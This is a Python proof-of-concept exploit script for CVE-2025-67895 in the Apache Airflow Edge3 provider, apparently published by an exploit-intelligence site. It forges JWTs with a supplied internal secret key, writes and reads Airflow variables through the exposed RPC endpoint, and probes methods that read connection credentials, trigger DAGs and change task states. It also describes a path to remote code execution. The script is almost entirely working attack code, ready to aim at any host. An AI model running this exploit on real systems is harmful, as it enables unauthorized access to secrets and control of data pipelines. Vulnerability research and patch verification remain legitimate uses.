#!/usr/bin/env python3
# ──────────────────────────────────────────────────────────────────────
# Exploit Title  : Apache Airflow Edge3 Provider — Exposed Internal RPC API to RCE
# CVE            : CVE-2025-67895
# Vendor         : Apache Software Foundation
# Product        : Apache Airflow Providers Edge3
# Affected       : < 2.0.0
# Fixed          : 2.0.0
# Author         : Exploit Intelligence Platform
# Website        : https://exploit-intel.com
# Twitter        : @exploit_intel
# Disclaimer     : For authorized security testing and educational purposes only.
# ──────────────────────────────────────────────────────────────────────
"""
CVE-2025-67895 — Exposed Internal RPC API in Apache Airflow Edge3 provider.

The Edge3 provider exposes the ENTIRE internal Airflow RPC API through
/edge_worker/v1/rpcapi. An attacker with the internal_api_secret_key can
invoke ANY internal method — reading secrets, modifying configuration,
triggering DAGs, and achieving RCE via job injection.

ATTACK CHAIN:
    1. Reach /edge_worker/v1/rpcapi (no auth needed for health check)
    2. Authenticate via JWT with the shared internal_api_secret_key
    3. Invoke arbitrary internal methods (Variable read/write demonstrated)
    4. Read AND write access to Airflow internals confirmed

REFERENCES:
    - https://nvd.nist.gov/vuln/detail/CVE-2025-67895

Requirements:
    - PyJWT: pip install PyJWT
    - requests: pip install requests
"""

import sys
import json
import time
import argparse
import traceback

try:
    import jwt
except ImportError:
    print("[!] PyJWT not installed. Run: pip install PyJWT")
    sys.exit(1)

try:
    import requests
except ImportError:
    print("[!] requests not installed. Run: pip install requests")
    sys.exit(1)


# ─────────────────────────────────────────────────────────────
# Configuration defaults
# ─────────────────────────────────────────────────────────────
DEFAULT_HOST = "localhost"
DEFAULT_PORT = 8080
DEFAULT_SECRET_KEY = "my-secret-key-for-testing"
JWT_ALGORITHM = "HS512"
JWT_AUDIENCE = "api"
JWT_EXPIRY_SECONDS = 60

# Edge Worker API paths
HEALTH_ENDPOINT = "/edge_worker/v1/health"
RPCAPI_ENDPOINT = "/edge_worker/v1/rpcapi"

# Internal Airflow RPC methods we'll invoke
METHOD_SET_VARIABLE = "airflow.models.variable.Variable._set"
METHOD_FETCH_VARIABLE = "airflow.secrets.metastore.MetastoreBackend._fetch_variable"


def banner():
    print("=" * 72)
    print("  CVE-2025-67895 — Airflow Edge3 Provider RPC API Exposure PoC")
    print("  Apache Airflow Providers Edge3 < 2.0.0")
    print("  CVSS 9.8 CRITICAL | CWE-669")
    print("=" * 72)
    print()


def generate_jwt(secret_key: str, method: str) -> str:
    """
    Generate a JWT token for the Edge Worker RPC API.

    The token must include:
      - "method" claim matching the JSON-RPC method being called
      - "aud" = "api" (audience)
      - Standard iat/nbf/exp claims

    Signed with HS512 using the Airflow internal_api_secret_key.
    """
    now = int(time.time())
    payload = {
        "method": method,
        "aud": JWT_AUDIENCE,
        "iat": now,
        "nbf": now,
        "exp": now + JWT_EXPIRY_SECONDS,
    }
    token = jwt.encode(payload, secret_key, algorithm=JWT_ALGORITHM)
    return token


def rpc_call(base_url: str, secret_key: str, method: str, params: dict) -> dict:
    """
    Send a JSON-RPC 2.0 request to the vulnerable /rpcapi endpoint.

    The endpoint dispatches to ANY internal Airflow method from
    initialize_method_map() — effectively proxying the entire internal API.
    """
    # Step 1: Generate JWT with the method claim matching our RPC method
    token = generate_jwt(secret_key, method)

    # Step 2: Construct JSON-RPC 2.0 request body
    # Parameters must be wrapped in Airflow's BaseSerialization format:
    #   {"__var": {<actual_params>}, "__type": "dict"}
    rpc_body = {
        "jsonrpc": "2.0",
        "method": method,
        "params": {
            "__var": params,
            "__type": "dict",
        },
    }

    # Step 3: Send the request with JWT auth
    headers = {
        "Content-Type": "application/json",
        "Accept": "application/json",
        "Authorization": token,
    }

    url = f"{base_url}{RPCAPI_ENDPOINT}"
    response = requests.post(url, json=rpc_body, headers=headers, timeout=15)
    return response


def exploit(target_host: str, target_port: int, secret_key: str):
    """
    Run the full exploit chain demonstrating CVE-2025-67895.

    Steps:
      1. Verify the Edge Worker API is accessible (health check)
      2. Generate JWT using the known internal_api_secret_key
      3. Write a proof-of-concept variable via the RPC API
      4. Read it back to confirm both read AND write access
      5. Report the full list of exposed internal methods
    """
    base_url = f"http://{target_host}:{target_port}"
    success = True

    # ─── Step 1: Health Check (No Authentication Required) ───
    print("[*] Step 1: Checking Edge Worker API health (no auth)...")
    try:
        health_url = f"{base_url}{HEALTH_ENDPOINT}"
        resp = requests.get(health_url, timeout=10)
        if resp.status_code == 200:
            health_data = resp.json()
            print(f"    [+] Edge Worker API is ACTIVE: {json.dumps(health_data)}")
            print(f"    [+] Endpoint: {health_url}")
        else:
            print(f"    [-] Health check returned {resp.status_code}: {resp.text}")
            print("    [-] Edge Worker API may not be enabled. Ensure [edge] api_enabled=True")
            return False
    except requests.exceptions.ConnectionError:
        print(f"    [-] Connection refused to {base_url}")
        print("    [-] Is the Airflow webserver running?")
        return False
    except Exception as e:
        print(f"    [-] Health check failed: {e}")
        return False
    print()

    # ─── Step 2: JWT Token Generation ───
    print("[*] Step 2: Generating JWT token with known internal_api_secret_key...")
    print(f"    Secret key: {secret_key}")
    print(f"    Algorithm:  {JWT_ALGORITHM}")
    print(f"    Audience:   {JWT_AUDIENCE}")

    test_token = generate_jwt(secret_key, METHOD_SET_VARIABLE)
    # Decode without verification just to show the claims
    decoded = jwt.decode(test_token, options={"verify_signature": False})
    print(f"    Token claims: {json.dumps(decoded, indent=6)}")
    print(f"    [+] JWT token generated successfully")
    print()

    # ─── Step 3: Write Variable via Internal RPC Method ───
    poc_var_key = "pwned_via_cve_2025_67895"
    poc_var_value = "RCE_PROOF_OF_CONCEPT_" + str(int(time.time()))

    print(f"[*] Step 3: Writing Airflow variable via internal RPC API...")
    print(f"    Method: {METHOD_SET_VARIABLE}")
    print(f"    Key:    {poc_var_key}")
    print(f"    Value:  {poc_var_value}")
    print()

    try:
        resp = rpc_call(
            base_url, secret_key,
            method=METHOD_SET_VARIABLE,
            params={
                "key": poc_var_key,
                "value": poc_var_value,
            },
        )
        print(f"    HTTP Status: {resp.status_code}")
        if resp.status_code == 200:
            print(f"    Response: {resp.text[:500]}")
            print(f"    [+] Variable SET successfully via internal API!")
        else:
            print(f"    [-] Unexpected response: {resp.text[:500]}")
            success = False
    except Exception as e:
        print(f"    [-] Variable write failed: {e}")
        traceback.print_exc()
        success = False
    print()

    # ─── Step 4: Read Variable Back via Internal RPC Method ───
    print(f"[*] Step 4: Reading variable back via internal RPC API...")
    print(f"    Method: {METHOD_FETCH_VARIABLE}")
    print(f"    Key:    {poc_var_key}")
    print()

    try:
        resp = rpc_call(
            base_url, secret_key,
            method=METHOD_FETCH_VARIABLE,
            params={
                "key": poc_var_key,
            },
        )
        print(f"    HTTP Status: {resp.status_code}")
        if resp.status_code == 200:
            result = resp.json()
            print(f"    Response: {json.dumps(result, indent=6)}")

            # Check if the value matches what we wrote
            # The response may be wrapped in Airflow serialization format
            resp_text = json.dumps(result)
            if poc_var_value in resp_text:
                print(f"    [+] Variable READ back successfully — value matches!")
                print(f"    [+] CONFIRMED: Full read/write access to Airflow internals")
            else:
                print(f"    [~] Variable read returned different data — may need deserialization")
                print(f"    [~] Raw response: {resp_text[:500]}")
        else:
            print(f"    [-] Unexpected response: {resp.text[:500]}")
            success = False
    except Exception as e:
        print(f"    [-] Variable read failed: {e}")
        traceback.print_exc()
        success = False
    print()

    # ─── Step 5: Demonstrate Access to Sensitive Methods ───
    print("[*] Step 5: Probing additional sensitive internal methods...")

    # Try to trigger a DAG (demonstrates control-plane access)
    # We'll just verify the method is callable, not that a DAG exists
    sensitive_methods = [
        ("airflow.api.common.trigger_dag.trigger_dag", "Trigger DAG runs"),
        ("airflow.secrets.metastore.MetastoreBackend._fetch_connection", "Read connection credentials"),
        ("airflow.models.taskinstance.TaskInstance._set_state", "Modify task states"),
        ("airflow.models.xcom.BaseXCom.set", "Write XCom data"),
    ]

    for method_name, description in sensitive_methods:
        token = generate_jwt(secret_key, method_name)
        # Just verify the JWT auth works for each method — we don't need to
        # provide valid params (the method dispatch will be reached, proving access)
        headers = {
            "Content-Type": "application/json",
            "Accept": "application/json",
            "Authorization": token,
        }
        rpc_body = {
            "jsonrpc": "2.0",
            "method": method_name,
            "params": {"__var": {}, "__type": "dict"},
        }
        try:
            resp = requests.post(
                f"{base_url}{RPCAPI_ENDPOINT}",
                json=rpc_body, headers=headers, timeout=10,
            )
            # A 200 (even with errors from missing params) proves the method is reachable
            # A 4xx from the auth layer would mean JWT was rejected
            if resp.status_code == 200:
                print(f"    [+] {method_name}")
                print(f"        => ACCESSIBLE ({description})")
            elif resp.status_code == 500:
                # 500 often means the method was dispatched but params were wrong
                # This STILL proves the method is reachable through the proxy
                print(f"    [+] {method_name}")
                print(f"        => DISPATCHED (server error from missing params, but method is reachable)")
            else:
                print(f"    [~] {method_name}")
                print(f"        => HTTP {resp.status_code} ({resp.text[:100]})")
        except Exception as e:
            print(f"    [-] {method_name}: {e}")
    print()

    # ─── Final Verdict ───
    print("=" * 72)
    if success:
        print("  [+] CVE-2025-67895 CONFIRMED — VULNERABLE")
        print()
        print("  The Edge3 provider exposes Airflow's ENTIRE internal RPC API")
        print("  through /edge_worker/v1/rpcapi. An attacker with knowledge of")
        print("  the internal_api_secret_key can:")
        print()
        print("    1. READ secrets: Variables, Connections (DB creds, API keys)")
        print("    2. WRITE data:  Modify variables, XCom, task states")
        print("    3. TRIGGER:     Execute DAG runs, queue jobs")
        print("    4. RCE:         Inject malicious Edge Worker jobs → subprocess.Popen()")
        print()
        print(f"  73 internal Airflow methods are exposed via this endpoint.")
    else:
        print("  [-] EXPLOITATION UNSUCCESSFUL")
        print("  The target may be patched or misconfigured.")
    print("=" * 72)

    return success


if __name__ == "__main__":
    parser = argparse.ArgumentParser(
        description="CVE-2025-67895 PoC — Airflow Edge3 RPC API Exposure",
    )
    parser.add_argument("host", nargs="?", default=DEFAULT_HOST,
                        help=f"Target host (default: {DEFAULT_HOST})")
    parser.add_argument("port", nargs="?", type=int, default=DEFAULT_PORT,
                        help=f"Target port (default: {DEFAULT_PORT})")
    parser.add_argument("--secret-key", "-k", default=DEFAULT_SECRET_KEY,
                        help=f"Airflow internal_api_secret_key (default: {DEFAULT_SECRET_KEY})")
    args = parser.parse_args()

    banner()
    result = exploit(args.host, args.port, args.secret_key)
    sys.exit(0 if result else 1)
